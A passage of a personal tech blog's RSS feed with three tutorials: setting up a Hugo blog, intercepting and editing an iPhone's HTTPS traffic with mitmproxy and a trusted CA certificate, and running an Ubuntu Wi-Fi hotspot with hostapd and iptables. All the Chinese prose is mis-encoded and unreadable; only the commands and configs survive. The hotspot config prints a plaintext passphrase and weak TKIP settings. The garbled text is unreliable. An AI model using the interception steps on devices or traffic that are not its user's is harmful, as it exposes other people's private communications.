&lt;p&gt;æºè‡ªäº wiredcraft çš„é¢è¯•ï¼Œè¿™ä¸ªå…¬å¸è®©è€å…«å¾ˆæ˜¯å‘å¾€ï¼Œå¯ä»¥è¿œç¨‹å·¥ä½œï¼Œç¬¬ä¸€æ¬¡é¢è¯•æ˜¯ devops ï¼Œè€å¤–è§é¢èŠäº†åï¼Œç”±ä»£ç†ä¸­å›½äººé¢ã€‚å› ä¸ºé¢çš„æ˜¯K8Sçš„ä¸œè¥¿ï¼Œæ­£å¥½åˆšç»™ç”»åŒ…åŒ…å…¬å¸åšäº†æ•´ä½“è¿å¾€é˜¿é‡ŒACKçš„å·¥ç¨‹ï¼Œä»¥ä¸ºæ²¡é—®é¢˜ï¼Œå®é™…æ˜¯ç›´æ¥é—®å€’äº†æˆ‘ã€‚å°±å¥½æ¯”master nodeä¸Šé¢éƒ½è·‘äº†ä»€ä¹ˆè¿›ç¨‹ï¼Œå”‰ï¼Œä¸€è¨€éš¾å°½å•Šï¼Œåˆé—®åˆ°ansibleçš„å˜é‡ï¼Œå›ç­”ä¼°è®¡ä¹Ÿä¸æ»¡æ„ï¼Œç»“æœå°±æŒ‚äº†&lt;/p&gt;
&lt;p&gt;çŸ¥è€»è€Œåå‹‡ï¼Œåé¢å»æ¶è¡¥äº†ä¸€ä¸‹ansibleå’Œk8sçš„ä¸œè¥¿ï¼Œå®é™…ä¹Ÿæ˜¯å®é™…æ“ä½œå±…å¤šï¼Œç„¶åç¬¬äºŒæ¬¡é¢çš„æ˜¯ sysadminï¼Œå…¨ç¨‹è€å¤–é¢ã€‚è¿˜å‡ºäº†å‡ é“é¢˜ï¼Œåº”è¯¥æ˜¯æ²¡é—®é¢˜ã€‚ä½†æ˜¯å·¥èµ„è¦é«˜äº†ï¼Œä¹Ÿè¢«åˆ·äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªåšå®¢å°±æ˜¯å…¶ä¸­ä¸€é“é¢˜ï¼Œé‚£æ—¢ç„¶æ­å»ºå‡ºæ¥äº†ï¼Œå¹²è„†å°±å¥½å¥½ç”¨å§ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬èº«è‡ªå·±å¯¹é™æ€çš„ Blog ç³»ç»Ÿä¹Ÿæ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œè‡ªå·±ä¸»ç«™ &lt;a href=&#34;https://www.rendoumi.com&#34;&gt;www.rendoumi.com&lt;/a&gt; çš„ Blog æ˜¯ç”± journey æ­å»ºçš„ï¼Œæ˜¯ä¸€ä¸ªç²¾å·§çš„ go ç¨‹åºï¼Œæœ€å¦™çš„æ˜¯å®ƒå…¼å®¹ Ghost åšå®¢ç³»ç»Ÿï¼Œä¹Ÿèƒ½ä½¿ç”¨ Ghost çš„ theme ï¼Œè¿™æ ·å°±å®Œç¾çš„æŠŠè‡ªå·±ä»¥å‰ Ghost çš„åšå®¢è¿ç§»äº†è¿‡å»ï¼Œä½†æ˜¯ï¼Œé‡Œé¢æ–‡ç« æœ‰å¾ˆå¤šè¿‡æ—¶äº†ï¼Œä½†ä¹Ÿä¸æƒ³æ¸…ç†ï¼Œå¹²è„†å€Ÿç€è¿™ä¸ªæœºä¼šï¼Œä»æ–°å¼€å§‹ã€‚æ­ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ç³»ç»Ÿç»§ç»­å†™æ–°åšå®¢&lt;/p&gt;
&lt;p&gt;æµè¡Œçš„ Markdown å†™ä½œå¹³å°æœ‰Hexoå’ŒHugoï¼Œé€‰Hugoæ˜¯å› ä¸ºå®åœ¨æ˜¯ä¸å–œæ¬¢nodeï¼Œå¼„ä¸€å †npmï¼Œè¿ç§»éº»çƒ¦æ­»ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªåšå®¢ç¨‹åºåŸºäºHugoï¼Œæ‰˜ç®¡åœ¨ githubï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œgithub æ˜¯æ‰˜ç®¡é™æ€æ–‡ä»¶çš„åœ°æ–¹ï¼ŒMarkdownçš„æœ€å¤§æ¯›ç—…æ˜¯å›¾ç‰‡ã€‚å›¾ç‰‡æ”¾åœ¨å›¾åºŠä¹Ÿä¸æ˜¯å¥½åŠæ³•ï¼Œæ‰€ä»¥å›¾ç‰‡å’Œé™æ€æ–‡ä»¶è¦åœ¨ä¸€èµ·ï¼Œä¸‹é¢å°±è¯´ä¸€ä¸‹æ­å»ºè¿‡ç¨‹ï¼Œæˆ‘çš„ä¸»æœºæ˜¯Ubuntuï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ä¸‹è½½hugo&#34;&gt;ä¸€ã€ä¸‹è½½Hugo&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼š &lt;a href=&#34;https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz&#34;&gt;https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf hugo_0.88.1_Linux-64bit.tar.gz          
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒåˆå§‹ä¸€ä¸ªåšå®¢å†™ä½œç›®å½•&#34;&gt;äºŒã€åˆå§‹ä¸€ä¸ªåšå®¢å†™ä½œç›®å½•&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./hugo new site MyBlog   
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹&lt;/p&gt;
&lt;h2 id=&#34;ä¸‰ä¸‹è½½theme&#34;&gt;ä¸‰ã€ä¸‹è½½theme&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; MyBlog
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/halogenica/beautifulhugo.git themes/beautifulhugo                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;theme&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;beautifulhugo&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; config.toml   
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹&lt;/p&gt;
&lt;h2 id=&#34;å››å†™ä¸€ç¯‡æ–°æ–‡ç« &#34;&gt;å››ã€å†™ä¸€ç¯‡æ–°æ–‡ç« &lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd MyBlog
../hugo new posts/my-first-post.md                                                                                               echo &amp;#34;#### This is another Blog&amp;#34; &amp;gt;&amp;gt; content/posts/my-first-post.md  
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;äº”è¿è¡Œserverbuildè‰ç¨¿&#34;&gt;äº”ã€è¿è¡Œserverï¼Œbuildè‰ç¨¿&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; MyBlog                                                                                                                       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;../hugo server --buildDrafts   
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹&lt;/p&gt;</description>
    </item>
    <item>
      <title>Iphoneæ‰‹æœºçš„httpsæŠ“åŒ…</title>
      <link>https://rendoumi.com/posts/20211014-iphone_hijack/</link>
      <pubDate>Thu, 14 Oct 2021 09:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211014-iphone_hijack/</guid>
      <description>&lt;p&gt;ä¸Šä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬å®æ–½äº†Ubuntuä¸‹wifiçƒ­ç‚¹çš„æ­å»ºï¼Œé‚£ä¹ˆï¼Œå…¶å®æˆ‘æ˜¯æƒ³æŠ“æˆ‘iphoneæ‰‹æœºçš„httpsæ˜æ–‡æµé‡åŒ…æ¥ç€ã€‚&lt;/p&gt;
&lt;p&gt;æ€ä¹ˆæŠ“å–å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ–¹æ³•ä¹Ÿå¾ˆç®€å•&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…-mitmproxy&#34;&gt;ä¸€ã€å®‰è£… mitmproxy&lt;/h2&gt;
&lt;p&gt;æœ‰wifiçƒ­ç‚¹é‚£å°æœºå™¨çš„wlanç½‘å¡åœ°å€æ˜¯192.168.222.1ï¼Œå°±åœ¨é‚£å°ä¸Šå®‰è£…ï¼Œä¾¿äºæŠ“å–&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install mitmproxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒè¿è¡Œmitmproxy&#34;&gt;äºŒã€è¿è¡Œmitmproxy&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mitmproxy -p &lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ä¸‰é…ç½®iphoneå®‰è£…mitmè¯ä¹¦&#34;&gt;ä¸‰ã€é…ç½®iphoneå®‰è£…mitmè¯ä¹¦&lt;/h2&gt;
&lt;p&gt;æ‰“å¼€æ‰‹æœºï¼Œè·å–wifiçƒ­ç‚¹ï¼Œè®¾ç½®è¿™ä¸ªwifiä½¿ç”¨æ‰‹æœºä»£ç†ï¼Œ192.168.222.1:8080&lt;/p&gt;
&lt;p&gt;ç„¶åç”¨Safariæµè§ˆå™¨æ‰“å¼€ç½‘å€ï¼šhttp://mitm.it&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;Float Left&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211014-iphone_hijack/image-20211014144813987.png?width=200px&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾åˆ°&lt;strong&gt;IOS&lt;/strong&gt;é‚£è¡Œï¼Œä»”ç»†çœ‹ä¸€çœ‹è¯´æ˜&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;Float Left&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211014-iphone_hijack/image-20211014144923443.png?width=200&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡» Get mitmproxy-ca-cert.pem å®‰è£…æè¿°æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;å®‰è£…å®Œä»¥åï¼Œåœ¨è®¾ç½® &amp;ndash;&amp;gt; å·²ä¸‹è½½æè¿°æ–‡ä»¶ï¼Œå®‰è£…æè¿°æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;Float Left&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211014-iphone_hijack/image-20211014145145002.png?width=200&#34;&gt;&lt;/p&gt;
&lt;p&gt;å®‰è£…å¥½ä»¥åä¼šæ˜¾ç¤ºç»¿è‰²çš„å·²éªŒè¯&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;Float Left&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211014-iphone_hijack/image-20211014154731414.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨æ‰‹æœºä¸Šç”¨ safari è®¿é—®ç½‘å€ï¼šhttps://ip138.com&lt;/p&gt;
&lt;p&gt;å›åˆ° Ubuntu çš„å‘½ä»¤è¡Œçª—å£ï¼Œä¸Šä¸‹é€‰ä¸­æŠ“åˆ°çš„åŒ…ï¼Œç„¶åæŒ‰å›è½¦æŸ¥çœ‹ï¼Œå·¦å³å…‰æ ‡é”®ç§»åŠ¨ï¼Œå¯ä»¥çœ‹åˆ°responseæ˜¯æ˜æ–‡çš„ï¼Œqé”®æ˜¯è¿”å›ä¸Šä¸€çº§&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211014150022475&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211014-iphone_hijack/image-20211014150022475.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;å››åŒ…çš„æ‹¦æˆªä¿®æ”¹&#34;&gt;å››ã€åŒ…çš„æ‹¦æˆªä¿®æ”¹&lt;/h2&gt;
&lt;p&gt;ä¸Šé¢æ¼”ç¤ºçš„æ˜¯å¸¸è§„çš„æŸ¥çœ‹æ“ä½œï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹ mitmproxy çš„å¦ä¸€å¼ºå¤§åŠŸèƒ½ï¼Œæ‹¦æˆªä¿®æ”¹ request å’Œ responseã€‚&lt;/p&gt;
&lt;p&gt;è¾“å…¥ &lt;code&gt;i&lt;/code&gt;ï¼Œç„¶åè¾“å…¥ &lt;code&gt;~s&lt;/code&gt; å†æŒ‰å›è½¦é”®ï¼Œè¿™æ—¶å€™å°±è¿›å…¥äº† response æ‹¦æˆªæ¨¡å¼ã€‚å¦‚æœè¾“å…¥ &lt;code&gt; ~q&lt;/code&gt; åˆ™è¿›å…¥ request çš„æ‹¦æˆªæ¨¡å¼ï¼Œæ›´å¤šçš„å‘½ä»¤å¯ä»¥è¾“å…¥ &lt;code&gt;ï¼Ÿ&lt;/code&gt; æŸ¥çœ‹ã€‚æ‹¦æˆªæ¨¡å¼ä¸‹çš„é¡µé¢æ˜¾ç¤ºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211014150501427&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211014-iphone_hijack/image-20211014150501427.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…¶ä¸­çº¢è‰²çš„è¡¨ç¤ºè¯·æ±‚æ­£è¢«æ‹¦æˆªï¼Œè¿™æ—¶ Enter è¿›å…¥å å†æŒ‰ &lt;code&gt;e&lt;/code&gt; å°±å¯ä»¥ä¿®æ”¹ request æˆ–è€… responseã€‚ä¿®æ”¹æ—¶æ˜¯ç”¨ vim è¿›è¡Œç¼–è¾‘çš„ï¼Œä¿®æ”¹å®ŒæˆåæŒ‰ &lt;code&gt;a&lt;/code&gt; å°†è¯·æ±‚æ”¾è¡Œï¼Œå¦‚æœè¦æ”¾è¡Œæ‰€æœ‰è¯·æ±‚è¾“å…¥ &lt;code&gt;A&lt;/code&gt; å³å¯ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ubuntuä¸‹è‡ªå»ºä¸€ä¸ªwifiçƒ­ç‚¹ä¾›æ‰‹æœºä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20211014-linux_wifi/</link>
      <pubDate>Thu, 14 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211014-linux_wifi/</guid>
      <description>&lt;p&gt;å…¬å¸çš„wifiä¿¡å·å¾ˆå¼±ï¼Œä¹Ÿä¸ä¿é™©ã€‚çœäº‹èµ·è§ï¼Œè¿˜æ˜¯è‡ªå·±å»ºç«‹ä¸€ä¸ªå¥½&lt;/p&gt;
&lt;p&gt;usbæ— çº¿ç½‘å¡è®¾å¤‡å¿…é¡»æ˜¯ä¸€ä¸ª nl80211 å…¼å®¹çš„æ— çº¿è®¾å¤‡ï¼Œæ‰€ä»¥é©±åŠ¨å°±æ˜¯è¿™ä¸ªï¼šnl80211&lt;/p&gt;
&lt;p&gt;æˆ‘çš„æ“ä½œç³»ç»Ÿæ˜¯Ubuntuï¼Œå¦‚æœæ˜¯CentOSå‘½ä»¤åŸºæœ¬ä¸€æ ·&lt;/p&gt;
&lt;p&gt;æ’ä¸Šwifi usbå¡å ip a çœ‹ä¸€ä¸‹ç½‘å¡çš„åç§°ï¼Œæˆ‘è¿™é‡Œæ˜¯ï¼šwlx00a1b0817651ï¼Œå¤Ÿé•¿&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…hostapdè½¯ä»¶&#34;&gt;ä¸€ã€å®‰è£…hostapdè½¯ä»¶&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install -y hostapd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒå»ºç«‹hostapdconfæ–‡ä»¶&#34;&gt;äºŒã€å»ºç«‹hostapd.confæ–‡ä»¶&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;vi /etc/hostapd/hostapd.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;driver&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;nl80211&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ssid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;Fast_8188 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;channel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;interface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;wlx00a1b0817651&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wpa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wpa_passphrase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;GreatWall2021!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wpa_key_mgmt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;WPA-PSK&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wpa_pairwise&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;TKIP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ä¸‰å»ºç«‹å¯åŠ¨è„šæœ¬usrlocalbininitapsh&#34;&gt;ä¸‰ã€å»ºç«‹å¯åŠ¨è„šæœ¬/usr/local/bin/initAP.sh&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cat /usr/local/bin/initAP.sh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;start() {  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rfkill unblock all&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ifconfig wlx00a1b0817651 up 192.168.222.1 netmask 255.255.255.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;sleep 2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;dnsmasq -i wlx00a1b0817651 --dhcp-range&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;192.168.222.10,192.168.222.20,2h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Enable NAT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;sysctl -w net.ipv4.ip_forward&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -F  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -X  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -t nat -A POSTROUTING -s 192.168.222.0/24 -j SNAT --to 192.168.41.15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;hostapd -B /etc/hostapd/hostapd.conf  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;stop() {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -P INPUT ACCEPT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -P FORWARD ACCEPT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -P OUTPUT ACCEPT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -F&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -X&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -t nat -F&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -t nat -X&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -t mangle -F&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;iptables -t mangle -X&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl stop dnsmasq&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;pkill hostapd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/sbin/ip link set down dev wlx00a1b0817651&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;case $1 in  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;start)&lt;/span&gt;
